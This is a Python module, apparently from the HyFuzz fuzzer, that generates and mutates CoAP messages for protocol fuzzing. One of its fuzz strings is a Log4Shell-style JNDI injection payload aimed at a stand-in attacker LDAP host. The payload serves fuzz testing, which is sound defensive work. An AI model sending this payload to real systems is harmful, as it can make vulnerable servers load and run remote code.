"""CoAP protocol implementation used by HyFuzz."""

from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, Iterable, List, Mapping, MutableMapping

import numpy as np

from .base_protocol import BaseProtocol, ProtocolMutation


@dataclass(frozen=True)
class CoAPMessage:
    """Simple representation of a CoAP message."""

    code: str
    message_id: int
    token: str
    payload: str

    def to_dict(self) -> Mapping[str, Any]:
        return {
            "code": self.code,
            "message_id": self.message_id,
            "token": self.token,
            "payload": self.payload,
        }


class CoAPProtocol(BaseProtocol):
    """Protocol handler that focuses on fuzzing the CoAP application layer."""

    name = "coap"

    @property
    def default_port(self) -> int:  # pragma: no cover - simple getter
        return 5683

    def generate_seed_payloads(self) -> Iterable[Mapping[str, Any]]:
        seeds = [
            CoAPMessage("GET", 0x1234, "abcd", "").to_dict(),
            CoAPMessage("POST", 0x1337, "feed", "temperature=21.5").to_dict(),
        ]
        return tuple(seeds)

    def mutate_payload(self, payload: Mapping[str, Any]) -> List[ProtocolMutation]:
        self.validate_payload(payload)
        mutations: List[ProtocolMutation] = []
        baseline = payload.get("payload", "")
        fuzz_strings = [
            baseline[::-1],
            baseline.upper(),
            baseline + "\x00\x00",
            "{{${jndi:ldap://attacker}}}}",
        ]
        for idx, fuzzed in enumerate(fuzz_strings):
            confidence = float(np.clip(0.9 - idx * 0.2, 0.1, 0.95))
            mutations.append(ProtocolMutation("payload", baseline, fuzzed, confidence))
        return mutations

    def build_packet(self, payload: Mapping[str, Any]) -> bytes:
        packet = json.dumps(dict(payload), sort_keys=True)
        return packet.encode("utf-8")

    def parse_response(self, packet: bytes) -> MutableMapping[str, Any]:
        data = json.loads(packet.decode("utf-8"))
        return {
            "code": data.get("code", "2.05 Content"),
            "message_id": data.get("message_id", 0),
            "payload": data.get("payload", ""),
            "is_error": data.get("code", "").startswith("4"),
        }

    def validate_payload(self, payload: Mapping[str, Any]) -> None:
        super().validate_payload(payload)
        if "code" not in payload:
            raise ValueError("CoAP payload requires a request code")


if __name__ == "__main__":
    proto = CoAPProtocol()
    seeds = list(proto.generate_seed_payloads())
    assert seeds[0]["code"] == "GET"
    mutations = proto.mutate_payload(seeds[0])
    assert mutations
    packet = proto.build_packet(seeds[0])
    parsed = proto.parse_response(packet)
    assert "code" in parsed
    print("CoAPProtocol self-test passed.")
